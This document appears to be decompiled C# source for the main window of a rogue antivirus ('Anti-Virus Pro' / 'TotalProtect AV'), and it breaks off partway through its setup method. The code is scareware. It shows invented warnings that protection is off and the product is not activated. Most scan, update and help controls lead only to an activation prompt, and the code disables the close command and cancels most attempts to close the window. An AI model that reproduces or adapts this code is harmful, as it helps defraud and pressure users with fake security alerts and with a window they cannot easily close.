using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Windows.Forms.Layout;

public sealed class ControlPanel : Form
{
	private IContainer icontainer_0;

	private Class7 panel1;

	private Class7 panel2;

	private Class7 panel3;

	private Class7 panel4;

	private Class7 panel5;

	private Class7 panel6;

	private Label label1;

	private Label label3;

	private Label label2;

	private Label label4;

	private Label label6;

	private Label lblCompStatus;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Label label8;

	private Button button1;

	private RadioButton radioButton3;

	private RadioButton radioButton2;

	private RadioButton radioButton1;

	private Label label7;

	private Button button2;

	private Label label12;

	private Label label11;

	private Label label10;

	private Label label9;

	private Label label13;

	private Button btnHome;

	private Button btnUpdate;

	private Button btnSettings;

	private Button btnScan;

	private LinkLabel linkLabel3;

	private LinkLabel linkLabel2;

	private LinkLabel linkLabel1;

	private Label label5;

	private Label label15;

	private Label label14;

	private PictureBox pictureBox5;

	private NotifyIcon notifyIcon_0;

	private Class7 customPanel1;

	private ScanControl scanControl1;

	private Panel panel8;

	private Panel panel7;

	public ControlPanel()
	{
		InitializeComponent();
		if (Class6.bool_0)
		{
			IntPtr systemMenu = GetSystemMenu(((Control)this).get_Handle(), bool_0: false);
			EnableMenuItem(systemMenu, 61536, 3);
		}
		Class4.smethod_0();
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("coredll")]
	public static extern int SendMessage(IntPtr intptr_0, uint uint_0, int int_0, int int_1);

	[DllImport("User32")]
	private static extern IntPtr GetSystemMenu(IntPtr intptr_0, bool bool_0);

	[DllImport("User32")]
	private static extern bool EnableMenuItem(IntPtr intptr_0, int int_0, int int_1);

	private void label6_MouseHover(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		Label val = (Label)((sender is Label) ? sender : null);
		((Control)val).set_Font(new Font(((Control)val).get_Font(), (FontStyle)4));
		((Control)this).set_Cursor(Cursors.get_Hand());
	}

	private void label6_MouseLeave(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		Label val = (Label)((sender is Label) ? sender : null);
		((Control)val).set_Font(new Font(((Control)val).get_Font(), (FontStyle)0));
		((Control)this).set_Cursor(Cursors.get_Default());
	}

	private void lblCompStatus_Click(object sender, EventArgs e)
	{
		NotActivated notActivated = new NotActivated();
		((Control)notActivated).Show();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		NotActivated notActivated = new NotActivated();
		((Control)notActivated).Show();
	}

	private void ControlPanel_Resize(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)((Form)this).get_WindowState() == 1)
		{
			notifyIcon_0.set_Visible(true);
			((Form)this).set_ShowInTaskbar(false);
		}
	}

	private void notifyIcon_0_MouseClick(object sender, MouseEventArgs e)
	{
		((Control)this).Show();
		((Form)this).set_WindowState((FormWindowState)0);
		((Control)this).Focus();
	}

	private void notifyIcon_0_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		TooltipDialog tooltipDialog = new TooltipDialog();
		((Control)tooltipDialog).Show();
		((Control)tooltipDialog).Focus();
	}

	private void btnScan_Click(object sender, EventArgs e)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Expected O, but got Unknown
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Expected O, but got Unknown
		foreach (Control item in (ArrangedElementCollection)((Control)panel4).get_Controls())
		{
			Control val = item;
			val.set_Visible(false);
		}
		((Control)scanControl1).set_Visible(true);
		((Control)scanControl1).set_Dock((DockStyle)5);
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ControlPanel));
		((Control)btnHome).set_BackColor(Color.FromArgb(73, 73, 73));
		((Control)btnHome).set_BackgroundImage((Image)componentResourceManager.GetObject("btnSettings.BackgroundImage"));
		((ButtonBase)btnHome).set_FlatStyle((FlatStyle)0);
		((Control)btnHome).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnHome).set_ForeColor(Color.White);
		((Control)btnScan).set_BackColor(Color.White);
		((Control)btnScan).set_BackgroundImage((Image)null);
		((ButtonBase)btnScan).get_FlatAppearance().set_BorderColor(Color.FromArgb(207, 207, 207));
		((ButtonBase)btnScan).set_FlatStyle((FlatStyle)0);
		((Control)btnScan).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnScan).set_ForeColor(Color.FromArgb(73, 73, 73));
	}

	private void btnHome_Click(object sender, EventArgs e)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_012f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Expected O, but got Unknown
		foreach (Control item in (ArrangedElementCollection)((Control)panel4).get_Controls())
		{
			Control val = item;
			if (!val.get_Visible())
			{
				val.set_Visible(true);
			}
		}
		((Control)scanControl1).set_Visible(false);
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ControlPanel));
		((Control)btnScan).set_BackColor(Color.FromArgb(73, 73, 73));
		((Control)btnScan).set_BackgroundImage((Image)componentResourceManager.GetObject("btnSettings.BackgroundImage"));
		((ButtonBase)btnScan).set_FlatStyle((FlatStyle)0);
		((Control)btnScan).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnScan).set_ForeColor(Color.White);
		((Control)btnHome).set_BackColor(Color.White);
		((Control)btnHome).set_BackgroundImage((Image)null);
		((ButtonBase)btnHome).get_FlatAppearance().set_BorderColor(Color.FromArgb(207, 207, 207));
		((ButtonBase)btnHome).set_FlatStyle((FlatStyle)0);
		((Control)btnHome).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnHome).set_ForeColor(Color.FromArgb(73, 73, 73));
	}

	private void ControlPanel_Enter(object sender, EventArgs e)
	{
		((Control)this).Invalidate();
	}

	private void ControlPanel_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() != 1 && (int)e.get_CloseReason() != 6)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d2: Expected O, but got Unknown
		//IL_02df: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e9: Expected O, but got Unknown
		//IL_07d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07da: Expected O, but got Unknown
		//IL_0b27: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b31: Expected O, but got Unknown
		//IL_0bad: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bb7: Expected O, but got Unknown
		//IL_0bca: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd4: Expected O, but got Unknown
		//IL_0c83: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c8d: Expected O, but got Unknown
		//IL_0d19: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d23: Expected O, but got Unknown
		//IL_0ed2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0edc: Expected O, but got Unknown
		//IL_12b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_12bf: Expected O, but got Unknown
		//IL_133a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1344: Expected O, but got Unknown
		//IL_1363: Unknown result type (might be due to invalid IL or missing references)
		//IL_136d: Expected O, but got Unknown
		//IL_144a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1454: Expected O, but got Unknown
		//IL_168e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1698: Expected O, but got Unknown
		//IL_16b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_16c1: Expected O, but got Unknown
		//IL_176b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1775: Expected O, but got Unknown
		//IL_17fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1806: Expected O, but got Unknown
		//IL_1825: Unknown result type (might be due to invalid IL or missing references)
		//IL_182f: Expected O, but got Unknown
		//IL_18da: Unknown result type (might be due to invalid IL or missing references)
		//IL_18e4: Expected O, but got Unknown
		//IL_1976: Unknown result type (might be due to invalid IL or missing references)
		//IL_1980: Expected O, but got Unknown
		//IL_1a62: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a6c: Expected O, but got Unknown
		//IL_1b0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b15: Expected O, but got Unknown
		//IL_1bb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bc1: Expected O, but got Unknown
		//IL_1c63: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c6d: Expected O, but got Unknown
		//IL_1d0c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d16: Expected O, but got Unknown
		//IL_1e83: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e8d: Expected O, but got Unknown
		//IL_1f8a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f94: Expected O, but got Unknown
		//IL_1fc7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fd1: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ControlPanel));
		notifyIcon_0 = new NotifyIcon(icontainer_0);
		panel2 = new Class7();
		panel3 = new Class7();
		panel8 = new Panel();
		panel7 = new Panel();
		label15 = new Label();
		label14 = new Label();
		linkLabel3 = new LinkLabel();
		linkLabel2 = new LinkLabel();
		linkLabel1 = new LinkLabel();
		panel4 = new Class7();
		scanControl1 = new ScanControl();
		customPanel1 = new Class7();
		label13 = new Label();
		button2 = new Button();
		label12 = new Label();
		label11 = new Label();
		label10 = new Label();
		label9 = new Label();
		pictureBox2 = new PictureBox();
		label8 = new Label();
		panel5 = new Class7();
		button1 = new Button();
		radioButton3 = new RadioButton();
		radioButton2 = new RadioButton();
		radioButton1 = new RadioButton();
		label7 = new Label();
		btnUpdate = new Button();
		btnHome = new Button();
		panel6 = new Class7();
		btnScan = new Button();
		pictureBox5 = new PictureBox();
		btnSettings = new Button();
		pictureBox1 = new PictureBox();
		label6 = new Label();
		label5 = new Label();
		label4 = new Label();
		label3 = new Label();
		label2 = new Label();
		label1 = new Label();
		panel1 = new Class7();
		lblCompStatus = new Label();
		((Control)panel2).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((Control)panel4).SuspendLayout();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)panel5).SuspendLayout();
		((Control)panel6).SuspendLayout();
		((ISupportInitialize)pictureBox5).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		notifyIcon_0.set_BalloonTipIcon((ToolTipIcon)2);
		notifyIcon_0.set_BalloonTipText("Click here to activate.");
		notifyIcon_0.set_BalloonTipTitle("Please Activate your copy of Anti-Virus Pro");
		notifyIcon_0.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		notifyIcon_0.set_Text("Anti-Virus Pro\r\nWarning! Not Activated.");
		notifyIcon_0.set_Visible(true);
		notifyIcon_0.add_MouseClick(new MouseEventHandler(notifyIcon_0_MouseClick));
		notifyIcon_0.add_MouseDoubleClick(new MouseEventHandler(notifyIcon_0_MouseDoubleClick));
		panel2.method_5(Color.Empty);
		((Panel)panel2).set_BorderStyle((BorderStyle)1);
		((Control)panel2).get_Controls().Add((Control)(object)panel3);
		((Control)panel2).set_Dock((DockStyle)5);
		panel2.method_7(0f);
		panel2.method_1(Color.Empty);
		panel2.method_3(Color.Empty);
		((Control)panel2).set_Location(new Point(0, 26));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(874, 436));
		((Control)panel2).set_TabIndex(1);
		((Control)panel3).set_BackColor(Color.White);
		panel3.method_5(Color.FromArgb(200, 201, 201));
		((Control)panel3).get_Controls().Add((Control)(object)panel8);
		((Control)panel3).get_Controls().Add((Control)(object)panel7);
		((Control)panel3).get_Controls().Add((Control)(object)label15);
		((Control)panel3).get_Controls().Add((Control)(object)label14);
		((Control)panel3).get_Controls().Add((Control)(object)linkLabel3);
		((Control)panel3).get_Controls().Add((Control)(object)linkLabel2);
		((Control)panel3).get_Controls().Add((Control)(object)linkLabel1);
		((Control)panel3).get_Controls().Add((Control)(object)panel4);
		((Control)panel3).get_Controls().Add((Control)(object)btnUpdate);
		((Control)panel3).get_Controls().Add((Control)(object)btnHome);
		((Control)panel3).get_Controls().Add((Control)(object)panel6);
		panel3.method_7(0f);
		panel3.method_1(Color.Empty);
		panel3.method_3(Color.Empty);
		((Control)panel3).set_Location(new Point(3, 5));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(866, 425));
		((Control)panel3).set_TabIndex(0);
		((Control)panel8).set_Location(new Point(1, 111));
		((Control)panel8).set_Name("panel8");
		((Control)panel8).set_Size(new Size(17, 35));
		((Control)panel8).set_TabIndex(10);
		((Control)panel7).set_Location(new Point(858, 111));
		((Control)panel7).set_Name("panel7");
		((Control)panel7).set_Size(new Size(6, 35));
		((Control)panel7).set_TabIndex(9);
		((Control)label15).set_AutoSize(true);
		((Control)label15).set_Location(new Point(756, 11));
		((Control)label15).set_Name("label15");
		((Control)label15).set_Size(new Size(9, 13));
		((Control)label15).set_TabIndex(8);
		((Control)label15).set_Text("|");
		((Control)label14).set_AutoSize(true);
		((Control)label14).set_Location(new Point(696, 11));
		((Control)label14).set_Name("label14");
		((Control)label14).set_Size(new Size(9, 13));
		((Control)label14).set_TabIndex(7);
		((Control)label14).set_Text("|");
		((Control)linkLabel3).set_AutoSize(true);
		linkLabel3.set_LinkBehavior((LinkBehavior)2);
		linkLabel3.set_LinkColor(Color.FromArgb(73, 73, 73));
		((Control)linkLabel3).set_Location(new Point(766, 11));
		((Control)linkLabel3).set_Name("linkLabel3");
		((Control)linkLabel3).set_Size(new Size(90, 13));
		((Control)linkLabel3).set_TabIndex(6);
		((Label)linkLabel3).set_TabStop(true);
		((Control)linkLabel3).set_Text("Help and Support");
		((Control)linkLabel3).add_Click((EventHandler)lblCompStatus_Click);
		((Control)linkLabel2).set_AutoSize(true);
		linkLabel2.set_LinkBehavior((LinkBehavior)2);
		linkLabel2.set_LinkColor(Color.FromArgb(73, 73, 73));
		((Control)linkLabel2).set_Location(new Point(708, 11));
		((Control)linkLabel2).set_Name("linkLabel2");
		((Control)linkLabel2).set_Size(new Size(46, 13));
		((Control)linkLabel2).set_TabIndex(5);
		((Label)linkLabel2).set_TabStop(true);
		((Control)linkLabel2).set_Text("Register");
		linkLabel2.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel2_LinkClicked));
		((Control)linkLabel2).add_Click((EventHandler)button1_Click);
		((Control)linkLabel1).set_AutoSize(true);
		linkLabel1.set_LinkBehavior((LinkBehavior)2);
		linkLabel1.set_LinkColor(Color.FromArgb(73, 73, 73));
		((Control)linkLabel1).set_Location(new Point(650, 11));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(42, 13));
		((Control)linkLabel1).set_TabIndex(4);
		((Label)linkLabel1).set_TabStop(true);
		((Control)linkLabel1).set_Text("Update");
		((Control)linkLabel1).add_Click((EventHandler)lblCompStatus_Click);
		panel4.method_5(Color.FromArgb(200, 201, 201));
		((Control)panel4).get_Controls().Add((Control)(object)customPanel1);
		((Control)panel4).get_Controls().Add((Control)(object)scanControl1);
		((Control)panel4).get_Controls().Add((Control)(object)label13);
		((Control)panel4).get_Controls().Add((Control)(object)button2);
		((Control)panel4).get_Controls().Add((Control)(object)label12);
		((Control)panel4).get_Controls().Add((Control)(object)label11);
		((Control)panel4).get_Controls().Add((Control)(object)label10);
		((Control)panel4).get_Controls().Add((Control)(object)label9);
		((Control)panel4).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panel4).get_Controls().Add((Control)(object)label8);
		((Control)panel4).get_Controls().Add((Control)(object)panel5);
		panel4.method_7(0f);
		panel4.method_1(Color.Empty);
		panel4.method_3(Color.Empty);
		((Control)panel4).set_Location(new Point(155, 30));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(703, 282));
		((Control)panel4).set_TabIndex(1);
		customPanel1.method_5(Color.Empty);
		customPanel1.method_7(0f);
		customPanel1.method_1(Color.Empty);
		customPanel1.method_3(Color.Empty);
		((Control)customPanel1).set_Location(new Point(25, 185));
		((Control)customPanel1).set_Name("customPanel1");
		((Control)customPanel1).set_Size(new Size(404, 2));
		((Control)customPanel1).set_TabIndex(11);
		((Control)scanControl1).set_Location(new Point(326, 59));
		((Control)scanControl1).set_Name("scanControl1");
		((Control)scanControl1).set_Size(new Size(190, 74));
		((Control)scanControl1).set_TabIndex(12);
		((Control)scanControl1).set_Visible(false);
		((Control)label13).set_AutoSize(true);
		((Control)label13).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label13).set_ForeColor(Color.Red);
		((Control)label13).set_Location(new Point(22, 213));
		((Control)label13).set_Name("label13");
		((Control)label13).set_Size(new Size(242, 45));
		((Control)label13).set_TabIndex(9);
		((Control)label13).set_Text("TotalProtect AV is not activated!\r\nYou will not be protected until you complete\r\nactivation.");
		((Control)button2).set_BackgroundImage((Image)componentResourceManager.GetObject("button2.BackgroundImage"));
		((Control)button2).set_Font(new Font("Tahoma", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_ForeColor(Color.White);
		((Control)button2).set_Location(new Point(284, 213));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(219, 49));
		((Control)button2).set_TabIndex(8);
		((Control)button2).set_Text("Activate now");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)lblCompStatus_Click);
		((Control)label12).set_AutoSize(true);
		((Control)label12).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label12).set_ForeColor(Color.Red);
		((Control)label12).set_Location(new Point(288, 160));
		((Control)label12).set_Name("label12");
		((Control)label12).set_Size(new Size(155, 13));
		((Control)label12).set_TabIndex(7);
		((Control)label12).set_Text("Last updated a month ago");
		((Control)label11).set_AutoSize(true);
		((Control)label11).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label11).set_ForeColor(Color.Red);
		((Control)label11).set_Location(new Point(288, 140));
		((Control)label11).set_Name("label11");
		((Control)label11).set_Size(new Size(23, 13));
		((Control)label11).set_TabIndex(6);
		((Control)label11).set_Text("Off");
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Location(new Point(50, 160));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(83, 13));
		((Control)label10).set_TabIndex(5);
		((Control)label10).set_Text("Virus definitions:");
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Location(new Point(50, 140));
		((Control)label9).set_Name("label9");
		((Control)label9).set_Size(new Size(104, 13));
		((Control)label9).set_TabIndex(4);
		((Control)label9).set_Text("Real-time protection:");
		pictureBox2.set_Image((Image)(object)Class3.smethod_17());
		((Control)pictureBox2).set_Location(new Point(9, 19));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(124, 100));
		pictureBox2.set_TabIndex(3);
		pictureBox2.set_TabStop(false);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_ForeColor(Color.FromArgb(155, 40, 58));
		((Control)label8).set_Location(new Point(143, 30));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(369, 30));
		((Control)label8).set_TabIndex(2);
		((Control)label8).set_Text("You haven't run a scan on your computer for a while. This could put\r\nyour computer at risk.\r\n");
		((Control)panel5).set_BackColor(Color.FromArgb(239, 242, 246));
		panel5.method_5(Color.Empty);
		((Control)panel5).get_Controls().Add((Control)(object)button1);
		((Control)panel5).get_Controls().Add((Control)(object)radioButton3);
		((Control)panel5).get_Controls().Add((Control)(object)radioButton2);
		((Control)panel5).get_Controls().Add((Control)(object)radioButton1);
		((Control)panel5).get_Controls().Add((Control)(object)label7);
		panel5.method_7(0f);
		panel5.method_1(Color.Empty);
		panel5.method_3(Color.Empty);
		((Control)panel5).set_Location(new Point(522, 1));
		((Control)panel5).set_Name("panel5");
		((Control)panel5).set_Size(new Size(180, 280));
		((Control)panel5).set_TabIndex(0);
		((Control)button1).set_Location(new Point(24, 185));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(147, 27));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("Scan now");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)radioButton3).set_AutoSize(true);
		((Control)radioButton3).set_Enabled(false);
		((Control)radioButton3).set_Location(new Point(24, 144));
		((Control)radioButton3).set_Name("radioButton3");
		((Control)radioButton3).set_Size(new Size(69, 17));
		((Control)radioButton3).set_TabIndex(3);
		radioButton3.set_TabStop(true);
		((Control)radioButton3).set_Text("Custom...");
		((ButtonBase)radioButton3).set_UseVisualStyleBackColor(true);
		((Control)radioButton3).add_Click((EventHandler)lblCompStatus_Click);
		((Control)radioButton2).set_AutoSize(true);
		((Control)radioButton2).set_Enabled(false);
		((Control)radioButton2).set_Location(new Point(24, 112));
		((Control)radioButton2).set_Name("radioButton2");
		((Control)radioButton2).set_Size(new Size(41, 17));
		((Control)radioButton2).set_TabIndex(2);
		((Control)radioButton2).set_Text("Full");
		((ButtonBase)radioButton2).set_UseVisualStyleBackColor(true);
		((Control)radioButton2).add_Click((EventHandler)lblCompStatus_Click);
		((Control)radioButton1).set_AutoSize(true);
		radioButton1.set_Checked(true);
		((Control)radioButton1).set_Location(new Point(24, 80));
		((Control)radioButton1).set_Name("radioButton1");
		((Control)radioButton1).set_Size(new Size(53, 17));
		((Control)radioButton1).set_TabIndex(1);
		radioButton1.set_TabStop(true);
		((Control)radioButton1).set_Text("Quick");
		((ButtonBase)radioButton1).set_UseVisualStyleBackColor(true);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_Location(new Point(20, 31));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(89, 16));
		((Control)label7).set_TabIndex(0);
		((Control)label7).set_Text("Scan options:");
		((Control)btnUpdate).set_BackColor(Color.FromArgb(73, 73, 73));
		((Control)btnUpdate).set_BackgroundImage((Image)componentResourceManager.GetObject("btnUpdate.BackgroundImage"));
		((ButtonBase)btnUpdate).set_FlatStyle((FlatStyle)0);
		((Control)btnUpdate).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnUpdate).set_ForeColor(Color.White);
		((Control)btnUpdate).set_Location(new Point(18, 89));
		((Control)btnUpdate).set_Name("btnUpdate");
		((Control)btnUpdate).set_Size(new Size(143, 34));
		((Control)btnUpdate).set_TabIndex(2);
		((Control)btnUpdate).set_Text("Update");
		((ButtonBase)btnUpdate).set_UseVisualStyleBackColor(false);
		((Control)btnUpdate).add_Click((EventHandler)lblCompStatus_Click);
		((Control)btnHome).set_BackColor(Color.White);
		((ButtonBase)btnHome).get_FlatAppearance().set_BorderColor(Color.FromArgb(207, 207, 207));
		((ButtonBase)btnHome).set_FlatStyle((FlatStyle)0);
		((Control)btnHome).set_Font(new Font("Tahoma", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)btnHome).set_ForeColor(Color.FromArgb(73, 73, 73));
		((Control)btnHome).set_Location(new Point(18, 49));
		((Control)btnHome).set_Name("btnHome");
		((Control)btnHome).set_Size(new Size(139, 34));
		((Control)btnHome).set_TabIndex(1);
		((Control)btnHome).set_Text("Home");
		((ButtonBase)btnHome).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)btnHome).set_UseVisualStyleBackColor(false);
		((Control)btnHome).add_Click((EventHandler)btnHome_Click);
		panel6.method_5(Color.White);
		((Control)panel6).get_Controls().Add((Control)(object)btnScan);
		((Control)panel6).get_Controls().Add((Control)(object)pictureBox5);
		((Control)panel6).get_Controls().Add((Control)(object)btnSettings);
		((Control)panel6).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel6).get_Controls().Add((Control)(object)label6);
		((Control)panel6).get_Controls().Add((Control)(object)label5);
		((Control)panel6).get_Controls().Add((Control)(object)label4);
		((Control)panel6).get_Controls().Add((Control)(object)label3);
		((Control)panel6).get_Controls().Add((Control)(object)label2);
		((Control)panel6).get_Controls().Add((Control)(object)label1);
		panel6.method_7(270f);
		panel6.method_1(Color.FromArgb(200, 201, 201));
		panel6.method_3(Color.Empty);
		((Control)panel6).set_Location(new Point(1, 129));
		((Control)panel6).set_Name("panel6");
		((Control)panel6).set_Size(new Size(864, 295));
		((Control)panel6).set_TabIndex(3);
